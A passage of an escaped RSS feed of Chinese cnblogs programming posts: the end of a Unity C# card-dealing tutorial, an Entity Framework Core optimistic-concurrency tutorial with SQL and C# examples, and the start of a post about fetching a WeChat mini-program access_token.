            &lt;/span&gt;&lt;span&gt;yield&lt;/span&gt; &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; WaitForSeconds(&lt;span&gt;1&lt;/span&gt; /&lt;span&gt; dealCardSpeed);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;下一个需要发牌者&lt;/span&gt;
&lt;span&gt;            SetNextPlayer();
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;隐藏牌堆&lt;/span&gt;
        heapPos.gameObject.SetActive(&lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
        playerHeapPos[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;].gameObject.SetActive(&lt;span&gt;false&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;显示玩家手牌&lt;/span&gt;
        Players.ToList().ForEach(s =&amp;gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; player0 = s &lt;span&gt;as&lt;/span&gt;&lt;span&gt; PlayerSelf;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (player0 != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                player0.GenerateAllCards();
            }
        });
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;动画结束，进入叫牌阶段&lt;/span&gt;
        &lt;span&gt;yield&lt;/span&gt; &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; WaitForSeconds(2f);
        covers.ForEach(Destroy);
        cardManagerState &lt;/span&gt;=&lt;span&gt; CardManagerStates.Bid;
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 清空牌局
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ClearCards()
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;清空所有玩家卡牌&lt;/span&gt;
        Players.ToList().ForEach(s =&amp;gt;&lt;span&gt; s.DropCards());

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;显示玩家手牌&lt;/span&gt;
        Players.ToList().ForEach(s =&amp;gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; player0 = s &lt;span&gt;as&lt;/span&gt;&lt;span&gt; PlayerSelf;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (player0 != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                player0.DestroyAllCards();
            }
        });
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 获取下个玩家
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;

    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; SetNextPlayer()
    {
        termCurrentIndex &lt;/span&gt;= (termCurrentIndex + &lt;span&gt;1&lt;/span&gt;) %&lt;span&gt; Players.Length;
    }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 切换开始回合玩家
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; SetNextTerm()
    {
        termStartIndex &lt;/span&gt;= (termStartIndex + &lt;span&gt;1&lt;/span&gt;) %&lt;span&gt; Players.Length;
    }
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] GetCardNames()
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;路径  &lt;/span&gt;
        &lt;span&gt;string&lt;/span&gt; fullPath = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Assets/Resources/Images/Cards/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (Directory.Exists(fullPath))
        {
            DirectoryInfo direction &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DirectoryInfo(fullPath);
            FileInfo[] files &lt;/span&gt;= direction.GetFiles(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;*.png&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, SearchOption.AllDirectories);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; files.Select(s =&amp;gt;&lt;span&gt; Path.GetFileNameWithoutExtension(s.Name)).ToArray();
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;for test&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnTestClick()
    {
        ClearCards();
        ShuffleCards();
        StartCoroutine(DealCards());
    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; 四、总结&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;其实发牌后的动画，可以由override基类的方法，交由Player子类处理，不用CardManager集中管理，大家可以优化一下。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;大体逻辑完成，我们验证下效果吧：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/371995/201710/371995-20171031110939215-299047755.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 31 Oct 2017 07:03:00 +0000</pubDate>
<dc:creator>Lancel0t</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lizzie-xhu/p/7761586.html</dc:identifier>
</item>
<item>
<title>浅析Entity Framework Core中的并发处理 - GuZhenYin</title>
<link>http://www.cnblogs.com/GuZhenYin/p/7761352.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/GuZhenYin/p/7761352.html</guid>
<description>&lt;p&gt;&lt;span&gt;前言&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Entity Framework Core 2.0更新也已经有一段时间了,园子里也有不少的文章..&lt;/p&gt;
&lt;p&gt;本文主要是浅析一下Entity Framework Core的并发处理方式.&lt;/p&gt;


&lt;p&gt;&lt;span&gt;1.常见的并发处理策略&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;要了解如何处理并发,就要知道并发的一般处理策略&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;悲观并发策略&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;悲观并发策略,正如其名,它指的是对数据被外界（包括本系统当前的其他事务,以及来自外部系统的事务处理）修改持保守悲观的态度,因此,在整个数据处理过程中,将数据处于锁定状态。悲观并发策略大多数情况下依靠数据库的锁机制实现，以保证操作最大程度的独占性。但随之而来的就是数据库性能的巨大开销,特别是对长事务而言,这样的开销在大量的并发情况下往往无法承受。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;strong&gt;乐观并发&lt;/strong&gt;策略&lt;/p&gt;
&lt;p&gt;乐观并发策略,一般是基于数据版本 Version记录机制实现。何谓数据版本？即为数据增加一个版本标识,在基于数据库表的版本解决方案中,一般是通过为数据库表增加一个 “version” 字段来实现.读取出数据时,将此版本号一同读出,之后更新时,对此版本号加一。此时,将提交数据的版本数据与数据库表对应记录的当前版本信息进行比对，&lt;strong&gt;如果提交的数据版本号大于数据库表当前版本号，则予以更新，否则认为是过期数据。&lt;/strong&gt;需要注意的是，乐观并发策略机制往往基于系统中的数据存储逻辑，因此也具备一定的局限性.&lt;/p&gt;
&lt;p&gt;本篇就是讲解,如何在我们的Entity Framework Core中来使用和&lt;strong&gt;自定义我们的并发策略&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;2.Entity Framework Core并发令牌&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;要使用Entity Framework Core中的并发策略,就需要使用我们的&lt;strong&gt;并发令牌(ConcurrencyCheck)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在Entity Framework Core中,并发的默认处理方式是无视并发冲突的,任何修改语句在条件符合的情况下,都可以修改成功.&lt;/p&gt;
&lt;p&gt;在高并发的情况下这种处理方式,肯定会给我们的数据库带来很多脏数据,所以,Entity Framework Core提供了&lt;strong&gt;并发令牌(ConcurrencyCheck)&lt;/strong&gt;这个特性.&lt;/p&gt;
&lt;p&gt;如果一个属性被配置为并发令牌，则EF将在保存这条记录时，会检查没有其他用户修改过数据库中的这个属性的值。EF使用了乐观并发策略，这意味着它将假定值没有改变，并尝试保存数据,但如果发现值已更改,则抛出异常。&lt;/p&gt;
&lt;p&gt;举个例子,我们有一个用户类(User),我们配置 User中的 Name为并发令牌。这意味着，如果一个用户试图保存一个有些变化的 User，但另一个用户已经改变了 &lt;code class=&quot;prettyprint prettyprinted&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Name&lt;/span&gt;&lt;/code&gt;那么将抛出一个异常。这在应用中一般是可取的，以便我们的应用程序可以提示用户，在保存他们的改变之前，以确保此记录仍然代表同一个姓名的人。&lt;/p&gt;
&lt;h2 id=&quot;how-concurrency-tokens-work-in-ef&quot;&gt;&lt;span&gt;2.1并发令牌在EF中工作的原理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;当我们配置User中的Name为令牌的时候,EF会&lt;span&gt;&lt;span&gt;将并发令牌包含在Where、Update&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;或delete&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;命令&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;子句中&lt;/span&gt;&lt;span&gt;并检查受影响的行数来&lt;/span&gt;&lt;span&gt;实现验证&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;如果并发令牌仍然匹配，则一行将被更新。&lt;/span&gt;&lt;span&gt;如果数据库中的值已更改，则不会更新任何行。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;比如,当我们设置Name为并发令牌,然后通过ID来修改User的PassWord的时候,&lt;/strong&gt;EF会生成如下的修改语句:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;UPDATE&lt;/span&gt; &lt;span&gt;[&lt;/span&gt;&lt;span&gt;User&lt;/span&gt;&lt;span&gt;]&lt;/span&gt; &lt;span&gt;SET&lt;/span&gt; &lt;span&gt;[&lt;/span&gt;&lt;span&gt;PassWord&lt;/span&gt;&lt;span&gt;]&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;@p1&lt;/span&gt;
&lt;span&gt;WHERE&lt;/span&gt; &lt;span&gt;[&lt;/span&gt;&lt;span&gt;ID&lt;/span&gt;&lt;span&gt;]&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;@p0&lt;/span&gt; &lt;span&gt;AND&lt;/span&gt; &lt;span&gt;[&lt;/span&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span&gt;]&lt;/span&gt; &lt;span&gt;=&lt;/span&gt; &lt;span&gt;@p2&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当然,这时候,Name不匹配了,受影响的行数返回为0.&lt;/p&gt;
&lt;h2&gt;2.2并发令牌的使用约定&lt;/h2&gt;
&lt;p&gt;    属性默认不被配置为并发令牌。&lt;/p&gt;

&lt;h2&gt;2.3并发令牌的使用方式&lt;/h2&gt;
&lt;p&gt;1.直接使用特性,如下配置UserName为并发令牌:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;partial&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserTable
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Id { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        [ConcurrencyCheck]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; UserName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; PassWord { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;? ClassId { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 2.使用FluentAPI配置属性为并发令牌&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyContext : DbContext
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DbSet&amp;lt;UserTable&amp;gt; People { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnModelCreating(ModelBuilder modelBuilder)
    {
        modelBuilder.Entity&lt;/span&gt;&amp;lt;UserTable&amp;gt;&lt;span&gt;()
            .Property(p &lt;/span&gt;=&amp;gt;&lt;span&gt; p.UserName)
            .IsConcurrencyToken();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;以上2种方式,效果是一样的.&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;2.4使用时间戳和行级版本号&lt;/h2&gt;
&lt;p&gt;我们知道,SQL Server给我们提供了时间戳的属性(当然,几乎所有的关系数据库都有这个).下面举个SQL Server的例子&lt;/p&gt;
&lt;p&gt;我们加一个&lt;strong&gt;时间戳字段为TimestampV,加上特性Timestamp,&lt;/strong&gt;实体代码如下:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;partial&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserTable
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Id { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; UserName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; PassWord { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;? ClassId { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ClassTable Class { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

        [Timestamp]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;byte&lt;/span&gt;[] TimestampV { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;CodeFrist生成的表如下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/653851/201710/653851-20171031134635355-632021605.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;自动帮我们生成的Timestamp类型的一个字段.&lt;/p&gt;
&lt;p&gt;配置时间戳属性的方式也有2种,上面已经说了一种..特性的..&lt;/p&gt;
&lt;p&gt;同样我们也可以使用Fluent API配置属性为时间戳,代码如下:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MyContext : DbContext
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DbSet&amp;lt;UserTable&amp;gt; Blogs { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnModelCreating(ModelBuilder modelBuilder)
    {
        modelBuilder.Entity&lt;/span&gt;&amp;lt;UserTable&amp;gt;&lt;span&gt;()
            .Property(p &lt;/span&gt;=&amp;gt;&lt;span&gt; p.TimestampV)
            .ValueGeneratedOnAddOrUpdate()
            .IsConcurrencyToken();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;span&gt;3.如何根据需求自定义处理并发冲突&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上面,我们已经配置好了需要并发处理的表,也配置好了相关的特性,下面我们就来讲讲如何使用它.&lt;/p&gt;
&lt;p&gt;使用之前,我们先来了解一下,&lt;strong&gt;并发过程中所产生的3个值,也是我们需要处理的3个值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;       1.&lt;strong&gt;当前值&lt;/strong&gt;是应用程序尝试写入数据库的值。&lt;/p&gt;
&lt;p&gt;       2.&lt;strong&gt;原始值&lt;/strong&gt;是在进行任何编辑之前最初从数据库检索的值。&lt;/p&gt;
&lt;p&gt;       3.&lt;strong&gt;数据库值&lt;/strong&gt;是当前存储在数据库中的值。&lt;/p&gt;
&lt;p&gt;当我们配置好上面的并发令牌时,在EF执行SaveChanges()操作并产生并发的时候,我们会得到&lt;strong&gt;DbUpdateConcurrencyException&lt;/strong&gt;的异常信息,(&lt;strong&gt;注意:在不配置并发令牌时,这个异常一般不会触发)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前面,我们已经讲过乐观并发策略是一种性能较高,也比较实用的处理方式,所以我们就通过时间戳来处理这个并发的问题.&lt;/p&gt;
&lt;p&gt;示例测试代码如下:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Test()
 {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;重新创建数据库,并新增一条数据&lt;/span&gt;
            &lt;span&gt;using&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; context = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; School_TestContext())
            {
                context.Database.EnsureDeleted();
                context.Database.EnsureCreated();

                context.UserTable.Add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; UserTable { UserName = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;John&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, PassWord = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Doe&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
                context.SaveChanges();
            }

            &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; context = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; School_TestContext())
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 修改id为1的用户名称&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; person = context.UserTable.Single(p =&amp;gt; p.Id == &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
                person.UserName &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;555-555-5555&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 直接通过访问数据库来修改同一条数据 (这里是为了模拟并发)&lt;/span&gt;
                context.Database.ExecuteSqlCommand(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UPDATE dbo.UserTable SET UserName = 'Jane' WHERE ID = 1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
                {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;尝试保存修改&lt;/span&gt;
                    &lt;span&gt;int&lt;/span&gt; a =&lt;span&gt; context.SaveChanges();
                }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取并发异常&lt;/span&gt;
                &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (DbUpdateConcurrencyException ex)
                {
                    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; entry &lt;span&gt;in&lt;/span&gt;&lt;span&gt; ex.Entries)
                    {
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (entry.Entity &lt;span&gt;is&lt;/span&gt;&lt;span&gt; UserTable)
                        {
                            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; databaseEntity = context.UserTable.AsNoTracking().Single(p =&amp;gt; p.Id ==&lt;span&gt; ((UserTable)entry.Entity).Id);
                            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; databaseEntry =&lt;span&gt; context.Entry(databaseEntity);

                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;当前上下文时间戳&lt;/span&gt;
                            &lt;span&gt;var&lt;/span&gt; date = ConvertToTimeSpanString(entry.Property(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;TimestampV&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).CurrentValue);
                            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; dateint =&lt;span&gt; Int32.Parse(date, System.Globalization.NumberStyles.HexNumber);

                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;数据库时间戳&lt;/span&gt;
                            &lt;span&gt;var&lt;/span&gt; datebase = ConvertToTimeSpanString(databaseEntry.Property(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;TimestampV&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).CurrentValue);
                            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; dateint2 =&lt;span&gt; Int32.Parse(datebase, System.Globalization.NumberStyles.HexNumber);
                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果当前上下文时间戳与数据库相同,或者更加新,则使用当前&lt;/span&gt;
                            &lt;span&gt;if&lt;/span&gt; (dateint &amp;gt;=&lt;span&gt; dateint2)
                            {
                                &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; property &lt;span&gt;in&lt;/span&gt;&lt;span&gt; entry.Metadata.GetProperties())
                                {
                                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;当前值&lt;/span&gt;
                                    &lt;span&gt;var&lt;/span&gt; proposedValue =&lt;span&gt; entry.Property(property.Name).CurrentValue;

                                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;原始值&lt;/span&gt;
                                    &lt;span&gt;var&lt;/span&gt; originalValue =&lt;span&gt; entry.Property(property.Name).OriginalValue;

                                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;数据库值&lt;/span&gt;
                                    &lt;span&gt;var&lt;/span&gt; databaseValue =&lt;span&gt; databaseEntry.Property(property.Name).CurrentValue;

                                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;更新当前值&lt;/span&gt;
                                    entry.Property(property.Name).CurrentValue =&lt;span&gt; proposedValue;

                                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;更新原始值来保证修改成功&lt;/span&gt;
                                    entry.Property(property.Name).OriginalValue =&lt;span&gt; databaseEntry.Property(property.Name).CurrentValue;
                                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 尝试重新保存数据&lt;/span&gt;
                                    &lt;span&gt;int&lt;/span&gt; aa =&lt;span&gt; context.SaveChanges();
                                }
                            }
                        }
                        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                        {
                            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; NotSupportedException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;无法处理并发,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +&lt;span&gt; entry.Metadata.Name);
                        }
                    }


                }
            }

        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;执行这段代码,会发现,符合我们乐观并发策略的要求.&lt;/p&gt;
&lt;p&gt;值为最后修改的UserName,为Jane,如图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/653851/201710/653851-20171031141454058-1708350609.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;解释一下,为何最终结果为Jane.&lt;/p&gt;
&lt;p&gt;首先,我们添加了一条UserName为John的数据,我们在上下文中修改它为&quot;555-555-5555&quot;,&lt;/p&gt;
&lt;p&gt;这时候,产生并发,另一个上下文在这个SaveChang之前,就执行完成了,把值修改为了Jane,所以EF通过并发令牌发现匹配失败.则会触发异常.&lt;/p&gt;
&lt;p&gt;在异常中,我们将当前上下文的版本号和数据库现有的版本号进行对比,发现当前上下文的版本号为过期数据,则不更新,并返回失败.&lt;/p&gt;
&lt;p&gt;请仔细看代码中的注释.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意:这里的例子是根据乐观并发处理策略要进行处理的.你可以根据你的业务,来任意处理当前值,原始值和数据库值,选择你需要的值保存.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;span&gt;写在最后&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;.net core已经2.0版本了,Asp.net Core也2.0了..EFcore也2.0了..功能已经越来越强大,越来越完善.完全可以投入生产了.园子里对这些新技术也很关注,真的...我感觉很棒..从未如此的棒!!!!&lt;/p&gt;
</description>
<pubDate>Tue, 31 Oct 2017 06:30:00 +0000</pubDate>
<dc:creator>GuZhenYin</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/GuZhenYin/p/7761352.html</dc:identifier>
</item>
<item>
<title>我只是想获取access_token而已 - anyhoo</title>
<link>http://www.cnblogs.com/anyhoo/p/7760917.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/anyhoo/p/7760917.html</guid>
<description>&lt;p&gt;   起因是想在微信小程序中&lt;span&gt;获取access_token&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;   &lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031104540902-221126972.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  之前资源只有&lt;span&gt;一个阿里云虚拟主机和一个域名&lt;/span&gt;，于是用C#后端写了GET请求的接口，准备调用自己域名下的接口获取access_token&lt;/p&gt;
&lt;p&gt;  使用微信的&lt;span&gt;wx.request&lt;/span&gt;接口&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:javascript;gutter:true;&quot;&gt;
    wx.request({
      url: &quot;www.xxxxxx.com/home/gettoken&quot;,
      success:function(res){
        console.log(res)
      }
    })
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　发现报错，提示&lt;span&gt;该域名不在服务器合法域名中&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;  于是去微信小程序的开发设置中的服务器域名配置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1000047/201710/1000047-20171031105308886-720462443.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  添加了request合法域名为 xxxxx.com；&lt;/p&gt;
